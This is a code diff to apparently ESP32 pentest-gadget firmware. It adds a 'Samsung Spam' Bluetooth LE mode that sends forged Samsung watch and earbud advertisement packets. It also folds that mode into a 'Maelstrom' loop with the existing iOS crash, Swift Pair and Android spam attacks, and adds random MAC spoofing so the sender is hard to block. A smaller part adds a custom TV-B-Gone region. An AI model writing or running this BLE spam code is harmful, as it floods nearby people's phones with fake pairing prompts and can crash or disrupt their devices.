@@ -235,6 +235,7 @@ bool rstOverride = false;   // Reset Button Override. Set to true when navigatin
 bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
 bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
+bool samsungSpam = true;   // Internal flag to place AppleJuice into Samsung Spam random packet Mode
 bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly
 bool activeQR = false; 
@@ -1107,8 +1108,11 @@ void tvbgone_setup() {
   if(region == NA) {
     DISP.print(TXT_RG_AMERICAS);
   }
-  else {
+  else if (region == EU) {
     DISP.println(TXT_RG_EMEA);
+  } 
+  else {
+    DISP.println(TXT_RG_CUSTOM);
   }
   DISP.println(TXT_SEL_GO_PAUSE);
   DISP.println(TXT_SEL_EXIT);
@@ -1129,6 +1133,7 @@ MENU tvbgmenu[] = {
   { TXT_BACK, 3},
   { TXT_MN_AMERICA, 0},
   { TXT_MN_EMEA, 1},
+  { TXT_MN_CUSTOM, 2}
 };
 int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);
 
@@ -1176,16 +1181,21 @@ void sendAllCodes() {
   bool endingEarly = false; //will be set to true if the user presses the button during code-sending
   if (region == NA) {
     num_codes = num_NAcodes;
-  } else {
+  } else if (region == EU) {
     num_codes = num_EUcodes;
+  } else {
+    num_codes = num_CUSTOMcodes;
   }
   for (i = 0 ; i < num_codes; i++)
   {
     if (region == NA) {
       powerCode = NApowerCodes[i];
     }
-    else {
+    else if (region == EU) {
       powerCode = EUpowerCodes[i];
+    }
+    else {
+      powerCode = CUSTOMpowerCodes[i];
     }
     const uint8_t freq = powerCode->timer_val;
     const uint8_t numpairs = powerCode->numpairs;
@@ -1343,6 +1353,7 @@ MENU btmenu[] = {
   { "AppleJuice", 0},
   { "Swift Pair", 1},
   { "Android Spam", 4},
+  { "Samsung Spam", 6},
   { TXT_SA_CRASH, 2},
   { "BT Maelstrom", 3},
 };
@@ -1354,6 +1365,7 @@ void btmenu_setup() {
   swiftPair = false;
   maelstrom = false;
   androidPair = false;
+  samsungSpam = false;
   rstOverride = true;
   drawmenu(btmenu, btmenu_size);
   delay(500); // Prevent switching after menu loads up
@@ -1423,8 +1435,31 @@ void btmenu_loop() {
         isSwitching = true;
         current_proc = 1;
         break;
+      
+      case 6:
+        samsungSpam = true;
+        current_proc = 9; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISP.print("Samsung Spam");
+        DISP.print(TXT_SEL_EXIT2);
     }
   }
+}
+
+void random_MAC(){
+  uint8_t tempMAC[ESP_BD_ADDR_LEN];
+      
+  // Keep ESP Manufactorer ID 
+  tempMAC[0] = 0x02;
+  tempMAC[1] = 0xE5;
+
+  // Generate random values for the MAC address and add them to the ESP ID
+  uint32_t randomBytes = esp_random();
+  memcpy(&tempMAC[2], &randomBytes, 4);
+
+  // Set new MAC address
+  esp_base_mac_addr_set(tempMAC);
 }
 
 MENU ajmenu[] = {
@@ -1473,6 +1508,7 @@ void aj_setup(){
   sourApple = false;
   swiftPair = false;
   maelstrom = false;
+  samsungSpam = false;
   rstOverride = true;
   drawmenu(ajmenu, ajmenu_size);
 }
@@ -1489,6 +1525,7 @@ void aj_loop(){
   if (check_select_press() || maelstrom) {
     deviceType = ajmenu[cursor].command;
     if (maelstrom) {
+      random_MAC();
       deviceType = random(1, 28);
     }
     switch(deviceType) {
@@ -1611,7 +1648,7 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  if (sourApple || swiftPair || androidPair || maelstrom){
+  if (sourApple || swiftPair || androidPair || maelstrom || samsungSpam){
     delay(20);   // 20msec delay instead of ajDelay for SourApple attack
     advtime = 0; // bypass ajDelay counter
   }
@@ -1698,6 +1735,52 @@ void aj_adv(){
         Serial.printf("%02x", packet[i]);
       }
       Serial.println("");
+    } else if (samsungSpam) {
+      //Code from https://github.com/Spooks4576/Ghost_ESP/blob/main/src/components/ble_module/ble_module.h
+
+      Serial.print(TXT_AD_SPAM_ADV);
+      uint8_t packet[15];
+      uint8_t i = 0;
+      int randval = random(1, 2);
+
+      if (randval == 1)
+      {
+        uint8_t model = watch_models[rand() % 25].value;
+          
+        packet[i++] = 14; // Size
+        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+        packet[i++] = 0x00; // ...
+        packet[i++] = 0x01;
+        packet[i++] = 0x00;
+        packet[i++] = 0x02;
+        packet[i++] = 0x00;
+        packet[i++] = 0x01;
+        packet[i++] = 0x01;
+        packet[i++] = 0xFF;
+        packet[i++] = 0x00;
+        packet[i++] = 0x00;
+        packet[i++] = 0x43;
+        packet[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+
+        oAdvertisementData.addData(std::string((char *)packet, 15));
+      }
+      else 
+      {
+        uint8_t advertisementPacket[] = {
+          0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
+          0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
+          0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
+        };
+
+        int randomIndex = rand() % samsung_buds_count;
+        uint32_t value = buds_models[randomIndex].value;
+        advertisementPacket[17] = (value >> 24) & 0xFF;
+        advertisementPacket[18] = (value >> 16) & 0xFF;
+        advertisementPacket[20] = (value >> 8) & 0xFF;
+
+        oAdvertisementData.addData(std::string((char *)advertisementPacket, 31));
+      }
     } else {
       Serial.print(TXT_AJ_ADV);
       if (deviceType >= 18){
@@ -1720,7 +1803,7 @@ void aj_adv(){
 #endif
   }
   if (check_next_press()) {
-    if (sourApple || swiftPair || androidPair || maelstrom){
+    if (sourApple || swiftPair || androidPair || maelstrom || samsungSpam){
       isSwitching = true;
       current_proc = 16;
       drawmenu(btmenu, btmenu_size);
@@ -1732,6 +1815,8 @@ void aj_adv(){
     sourApple = false;
     swiftPair = false;
     maelstrom = false;
+    samsungSpam = false;
+    androidPair = false;
     pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
     delay(250);
   }
@@ -1868,17 +1953,28 @@ void btmaelstrom_setup(){
 void btmaelstrom_loop(){
   swiftPair = false;
   sourApple = true;
+  androidPair = false;
+  samsungSpam = true;
   aj_adv();
   if (maelstrom){
     swiftPair = true;
     androidPair = false;
     sourApple = false;
+    samsungSpam = false;
     aj_adv();
   }
   if (maelstrom){
     swiftPair = false;
     androidPair = true;
     sourApple = false;
+    samsungSpam = false;
+    aj_adv();
+  }
+  if (maelstrom){
+    swiftPair = false;
+    androidPair = false;
+    sourApple = false;
+    samsungSpam = true;
     aj_adv();
   }
   if (maelstrom){
@@ -2383,7 +2479,7 @@ void setup() {
     Serial.printf("EEPROM 3 - TVBG Reg:   %d\n", EEPROM.read(3));
     Serial.printf("EEPROM 4 - FGColor:    %d\n", EEPROM.read(4));
     Serial.printf("EEPROM 5 - BGColor:    %d\n", EEPROM.read(5));
-    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19) {
+    if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(3) > 2 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19) {
       // Assume out-of-bounds settings are a fresh/corrupt EEPROM and write defaults for everything
       Serial.println("EEPROM likely not properly configured. Writing defaults.");
       #if defined(CARDPUTER)
